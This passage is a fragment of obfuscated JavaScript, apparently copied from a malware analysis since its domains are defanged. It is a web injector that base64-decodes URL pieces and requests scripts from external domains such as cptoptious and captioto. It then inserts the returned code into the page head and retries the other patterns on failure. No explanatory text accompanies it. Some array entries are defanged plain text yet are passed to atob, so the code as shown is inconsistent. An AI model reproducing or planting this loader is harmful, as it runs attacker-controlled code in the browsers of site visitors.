    "/jsrepo?rnd=", "hxxps[://]cptoptious[.]com", "/jsrepo?rnd=", "hxxps[://]captioto[.]com"
    ]; var patterns = [[0, 1], [2, 3], [4, 3]]; function loadPayload(index) { if (index
    >= patterns.length) return; try { var fullUrl = ""; var sequence = patterns[index];
    for (var k = 0; k < sequence.length; k++) { fullUrl += atob(urls[sequence[k]]);
    } var finalUrl = fullUrl + Math.random(); var xhr = new XMLHttpRequest(); xhr.open("GET",
    finalUrl, false); xhr.send(); if (xhr.status == 200) { var scriptElement = document.createElement("script");
    scriptElement.text = xhr.responseText; document.head.appendChild(scriptElement);
    } else { loadPayload(index + 1); } } catch (error) { loadPayload(index + 1); }
    } loadPayload(0); }
